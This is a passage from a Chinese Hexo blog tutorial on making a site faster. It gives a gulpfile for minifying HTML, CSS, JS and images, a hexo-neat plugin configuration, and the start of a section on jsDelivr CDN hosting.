title="方法一：gulp代码压缩"></a>方法一：gulp代码压缩</h3><p>因为hexo生成的html、css、js等都有很多的空格或者换行，而空格和换行也是占用字节的，所以需要将空格换行去掉也就是我要进行的“压缩”。</p><p>有人说空格换行能占多少字节？确实占不了多少，但是一个人访问是这么多字节，那么一百人，一万人呢？加起来这量就不少了吧，这都是流量啊！这也是很多css/js文件的后缀为<em>.min.js或</em>.min.css的原因。虽然我们可能没那么多访问量，但是能减小一点资源文件的大小也是对访问速度有那么一点提升的。</p><p>我们采用gulp代码压缩方式。</p><p><strong>使用方法：</strong></p><ol start="2"><li>进入站点根目录下依次执行下面的命令：</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 全局安装gulp模块</span><span class="token function">npm</span> <span class="token function">install</span> gulp -g<span class="token comment" spellcheck="true"># 安装各种小功能模块  执行这步的时候，可能会提示权限的问题，最好以管理员模式执行</span><span class="token function">npm</span> <span class="token function">install</span> gulp gulp-htmlclean gulp-htmlmin gulp-minify-css gulp-uglify gulp-imagemin --save<span class="token comment" spellcheck="true"># 额外的功能模块</span><span class="token function">npm</span> <span class="token function">install</span> gulp-debug gulp-clean-css gulp-changed gulp-if gulp-plumber gulp-babel babel-preset-es2015 del @babel/core --save</code></pre><ol start="3"><li>在Hexo根目录新建文件 <code>gulpfile.js</code>，并复制以下内容到文件中，有中文注释，可以根据自己需求修改。</li></ol><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> gulp <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"gulp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> debug <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"gulp-debug"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> cleancss <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"gulp-clean-css"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//css压缩组件</span><span class="token keyword">var</span> uglify <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"gulp-uglify"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//js压缩组件</span><span class="token keyword">var</span> htmlmin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"gulp-htmlmin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//html压缩组件</span><span class="token keyword">var</span> htmlclean <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"gulp-htmlclean"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//html清理组件</span><span class="token keyword">var</span> imagemin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"gulp-imagemin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//图片压缩组件</span><span class="token keyword">var</span> changed <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"gulp-changed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//文件更改校验组件</span><span class="token keyword">var</span> gulpif <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"gulp-if"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//任务 帮助调用组件</span><span class="token keyword">var</span> plumber <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"gulp-plumber"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//容错组件（发生错误不跳出任务，并报出错误内容）</span><span class="token keyword">var</span> isScriptAll <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//是否处理所有文件，(true|处理所有文件)(false|只处理有更改的文件)</span><span class="token keyword">var</span> isDebug <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//是否调试显示 编译通过的文件</span><span class="token keyword">var</span> gulpBabel <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"gulp-babel"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> es2015Preset <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"babel-preset-es2015"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> del <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"del"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> Hexo <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"hexo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> hexo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hexo</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 初始化一个hexo对象</span><span class="token comment" spellcheck="true">// 清除public文件夹</span>gulp<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span><span class="token string">"clean"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">del</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"public/**/*"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 下面几个跟hexo有关的操作，主要通过hexo.call()去执行，注意return</span><span class="token comment" spellcheck="true">// 创建静态页面 （等同 hexo generate）</span>gulp<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span><span class="token string">"generate"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> hexo<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> hexo            <span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token string">"generate"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>                watch<span class="token punctuation">:</span> <span class="token boolean">false</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> hexo<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> hexo<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 启动Hexo服务器</span>gulp<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span><span class="token string">"server"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> hexo        <span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> hexo<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token string">"server"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 部署到服务器</span>gulp<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span><span class="token string">"deploy"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> hexo<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> hexo            <span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token string">"deploy"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>                watch<span class="token punctuation">:</span> <span class="token boolean">false</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> hexo<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> hexo<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 压缩public目录下的js文件</span>gulp<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span><span class="token string">"compressJs"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> gulp        <span class="token punctuation">.</span><span class="token function">src</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"./public/**/*.js"</span><span class="token punctuation">,</span> <span class="token string">"!./public/libs/**"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">/</span><span class="token operator">/</span>排除的js        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">gulpif</span><span class="token punctuation">(</span><span class="token operator">!</span>isScriptAll<span class="token punctuation">,</span> <span class="token function">changed</span><span class="token punctuation">(</span><span class="token string">"./public"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">gulpif</span><span class="token punctuation">(</span>isDebug<span class="token punctuation">,</span> <span class="token function">debug</span><span class="token punctuation">(</span><span class="token punctuation">{</span> title<span class="token punctuation">:</span> <span class="token string">"Compress JS:"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">plumber</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>            <span class="token function">gulpBabel</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                presets<span class="token punctuation">:</span> <span class="token punctuation">[</span>es2015Preset<span class="token punctuation">]</span> <span class="token operator">/</span><span class="token operator">/</span> es5检查机制            <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">uglify</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span><span class="token operator">/</span><span class="token function">调用压缩组件方法uglify</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>对合并的文件进行压缩        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>gulp<span class="token punctuation">.</span><span class="token function">dest</span><span class="token punctuation">(</span><span class="token string">"./public"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span>输出到目标目录<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">/</span> 压缩<span class="token keyword">public</span>目录下的css文件gulp<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span><span class="token string">"compressCss"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> option <span class="token operator">=</span> <span class="token punctuation">{</span>        rebase<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token operator">/</span><span class="token operator">/</span>advanced<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token operator">/</span><span class="token operator">/</span>类型：Boolean 默认：<span class="token boolean">true</span> <span class="token punctuation">[</span>是否开启高级优化（合并选择器等）<span class="token punctuation">]</span>        compatibility<span class="token punctuation">:</span> <span class="token string">"ie7"</span> <span class="token operator">/</span><span class="token operator">/</span>保留ie7及以下兼容写法 类型：String 默认：<span class="token string">''</span>or<span class="token string">'*'</span> <span class="token punctuation">[</span>启用兼容模式； <span class="token string">'ie7'</span>：IE7兼容模式，<span class="token string">'ie8'</span>：IE8兼容模式，<span class="token string">'*'</span>：IE9<span class="token operator">+</span>兼容模式<span class="token punctuation">]</span>        <span class="token operator">/</span><span class="token operator">/</span>keepBreaks<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token operator">/</span><span class="token operator">/</span>类型：Boolean 默认：<span class="token boolean">false</span> <span class="token punctuation">[</span>是否保留换行<span class="token punctuation">]</span>        <span class="token operator">/</span><span class="token operator">/</span>keepSpecialComments<span class="token punctuation">:</span> <span class="token string">'*'</span> <span class="token operator">/</span><span class="token operator">/</span>保留所有特殊前缀 当你用autoprefixer生成的浏览器前缀，如果不加这个参数，有可能将会删除你的部分前缀    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> gulp        <span class="token punctuation">.</span><span class="token function">src</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"./public/**/*.css"</span><span class="token punctuation">,</span> <span class="token string">"!./public/**/*.min.css"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//排除的css</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">gulpif</span><span class="token punctuation">(</span><span class="token operator">!</span>isScriptAll<span class="token punctuation">,</span> <span class="token function">changed</span><span class="token punctuation">(</span><span class="token string">"./public"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">gulpif</span><span class="token punctuation">(</span>isDebug<span class="token punctuation">,</span> <span class="token function">debug</span><span class="token punctuation">(</span><span class="token punctuation">{</span> title<span class="token punctuation">:</span> <span class="token string">"Compress CSS:"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">plumber</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">cleancss</span><span class="token punctuation">(</span>option<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>gulp<span class="token punctuation">.</span><span class="token function">dest</span><span class="token punctuation">(</span><span class="token string">"./public"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 压缩public目录下的html文件</span>gulp<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span><span class="token string">"compressHtml"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> cleanOptions <span class="token operator">=</span> <span class="token punctuation">{</span>        protect<span class="token punctuation">:</span> <span class="token regex">/&lt;\!--%fooTemplate\b.*?%-->/g</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//忽略处理</span>        unprotect<span class="token punctuation">:</span> <span class="token operator">/</span><span class="token punctuation">]</span><span class="token operator">*</span>\btype<span class="token operator">=</span><span class="token string">"text\/x-handlebars-template"</span><span class="token punctuation">[</span>\s\S<span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">?</span><span class="token operator">&lt;</span>\<span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">/</span>gi <span class="token comment" spellcheck="true">//特殊处理</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> minOption <span class="token operator">=</span> <span class="token punctuation">{</span>        collapseWhitespace<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//压缩HTML</span>        collapseBooleanAttributes<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//省略布尔属性的值 &lt;input checked="true"/> ==> &lt;input /></span>        removeEmptyAttributes<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//删除所有空格作属性值 &lt;input id="" /> ==> &lt;input /></span>        removeScriptTypeAttributes<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//删除&lt;script>的type="text/javascript"</span>        removeStyleLinkTypeAttributes<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//删除&lt;style>和&lt;link>的type="text/css"</span>        removeComments<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//清除HTML注释</span>        minifyJS<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//压缩页面JS</span>        minifyCSS<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//压缩页面CSS</span>        minifyURLs<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token comment" spellcheck="true">//替换页面URL</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> gulp        <span class="token punctuation">.</span><span class="token function">src</span><span class="token punctuation">(</span><span class="token string">"./public/**/*.html"</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">gulpif</span><span class="token punctuation">(</span>isDebug<span class="token punctuation">,</span> <span class="token function">debug</span><span class="token punctuation">(</span><span class="token punctuation">{</span> title<span class="token punctuation">:</span> <span class="token string">"Compress HTML:"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">plumber</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">htmlclean</span><span class="token punctuation">(</span>cleanOptions<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">htmlmin</span><span class="token punctuation">(</span>minOption<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>gulp<span class="token punctuation">.</span><span class="token function">dest</span><span class="token punctuation">(</span><span class="token string">"./public"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 压缩 public/medias 目录内图片</span>gulp<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span><span class="token string">"compressImage"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> option <span class="token operator">=</span> <span class="token punctuation">{</span>        optimizationLevel<span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//类型：Number 默认：3 取值范围：0-7（优化等级）</span>        progressive<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//类型：Boolean 默认：false 无损压缩jpg图片</span>        interlaced<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//类型：Boolean 默认：false 隔行扫描gif进行渲染</span>        multipass<span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token comment" spellcheck="true">//类型：Boolean 默认：false 多次优化svg直到完全优化</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> gulp        <span class="token punctuation">.</span><span class="token function">src</span><span class="token punctuation">(</span><span class="token string">"./public/medias/**/*.*"</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">gulpif</span><span class="token punctuation">(</span><span class="token operator">!</span>isScriptAll<span class="token punctuation">,</span> <span class="token function">changed</span><span class="token punctuation">(</span><span class="token string">"./public/medias"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">gulpif</span><span class="token punctuation">(</span>isDebug<span class="token punctuation">,</span> <span class="token function">debug</span><span class="token punctuation">(</span><span class="token punctuation">{</span> title<span class="token punctuation">:</span> <span class="token string">"Compress Images:"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">plumber</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">imagemin</span><span class="token punctuation">(</span>option<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>gulp<span class="token punctuation">.</span><span class="token function">dest</span><span class="token punctuation">(</span><span class="token string">"./public"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 执行顺序： 清除public目录 -> 产生原始博客内容 -> 执行压缩混淆 -> 部署到服务器</span>gulp<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span>    <span class="token string">"build"</span><span class="token punctuation">,</span>    gulp<span class="token punctuation">.</span><span class="token function">series</span><span class="token punctuation">(</span>        <span class="token string">"clean"</span><span class="token punctuation">,</span>        <span class="token string">"generate"</span><span class="token punctuation">,</span>        <span class="token string">"compressHtml"</span><span class="token punctuation">,</span>        <span class="token string">"compressCss"</span><span class="token punctuation">,</span>        <span class="token string">"compressJs"</span><span class="token punctuation">,</span>        <span class="token string">"compressImage"</span><span class="token punctuation">,</span>        gulp<span class="token punctuation">.</span><span class="token function">parallel</span><span class="token punctuation">(</span><span class="token string">"deploy"</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 默认任务</span>gulp<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span>    <span class="token string">"default"</span><span class="token punctuation">,</span>    gulp<span class="token punctuation">.</span><span class="token function">series</span><span class="token punctuation">(</span>        <span class="token string">"clean"</span><span class="token punctuation">,</span>        <span class="token string">"generate"</span><span class="token punctuation">,</span>        gulp<span class="token punctuation">.</span><span class="token function">parallel</span><span class="token punctuation">(</span><span class="token string">"compressHtml"</span><span class="token punctuation">,</span> <span class="token string">"compressCss"</span><span class="token punctuation">,</span> <span class="token string">"compressJs"</span><span class="token punctuation">,</span><span class="token string">"compressImage"</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Gulp4最大的一个改变就是gulp.task函数现在只支持两个参数，分别是任务名和运行任务的函数&lt;/code></span></code></pre><ol start="4"><li><p>以后的执行方式有两种：</p><ul><li><p>直接在Hexo根目录执行 <code>gulp</code>或者 <code>gulp default</code> ，这个命令相当于 <code>hexo cl&amp;&amp;hexo g</code> 并且再把代码和图片压缩。</p></li><li><p>在Hexo根目录执行 <code>gulp build</code> ，这个命令与第1种相比是：在最后又加了个 <code>hexo d</code> ，等于说生成、压缩文件后又帮你自动部署了。</p></li></ul></li></ol><blockquote><p>值得注意的是：这个加入了图片压缩，如果不想用图片压缩可以把第154行的 <code>"compressImage",</code> 和第165行的 <code>,"compressImage"</code> 去掉即可</p></blockquote><h3 id="方法二：hexo-neat插件实现代码压缩"><a href="#方法二：hexo-neat插件实现代码压缩" class="headerlink" title="方法二：hexo-neat插件实现代码压缩"></a>方法二：hexo-neat插件实现代码压缩</h3><p>可能以上方法比较复杂，来介绍个简单的，<a href="https://github.com/rozbo/hexo-neat" target="_blank" rel="noopener">hexo-neat</a>插件也是用来压缩代码的，底层也是通过gulp来实现的。</p><p>但是这个插件是有Bug的：</p><ul><li>压缩 md 文件会使 markdown 语法的代码块消失</li><li>会删除全角空格</li></ul><p>在博客站点根目录执行安装代码：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-neat --save</code></pre><p>紧接着在站点根目录下的配置文件添加如下代码：</p><pre class=" language-yml"><code class="language-yml">neat_enable: trueneat_html:  enable: true  exclude:neat_css:  enable: true  exclude:    - '*.min.css'neat_js:  enable: true  mangle: true  output:  compress:  exclude:    - '*.min.js'</code></pre><p>然后直接 <code>hexo cl&amp;&amp;hexo g</code> 就可以了，会自动压缩文件 。</p><p><strong>补充</strong>：为了解决以上Bug，<strong>对于matery主题</strong>（其他主题自行解决）需要将以上默认配置修改为：</p><pre class=" language-yml"><code class="language-yml">#hexo-neat 优化提速插件（去掉HTML、css、js的blank字符）neat_enable: trueneat_html:  enable: true  exclude:    - '**/*.md'neat_css:  enable: true  exclude:    - '**/*.min.css'neat_js:  enable: true  mangle: true  output:  compress:  exclude:    - '**/*.min.js'    - '**/**/instantpage.js'    - '**/matery.js'</code></pre><h2 id="3-CDN加速"><a href="#3-CDN加速" class="headerlink" title="3. CDN加速"></a>3. CDN加速</h2><blockquote><p>CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。——百度百科</p></blockquote><p>放在Github的资源在国内加载速度比较慢，因此需要使用CDN加速来优化网站打开速度，jsDelivr + Github便是免费且好用的CDN，非常适合博客网站使用。</p><ol start="2"><li>首先新建GitHub仓库</li></ol><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191221175839.png" alt="">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191221175839.png" alt=""></p><ol 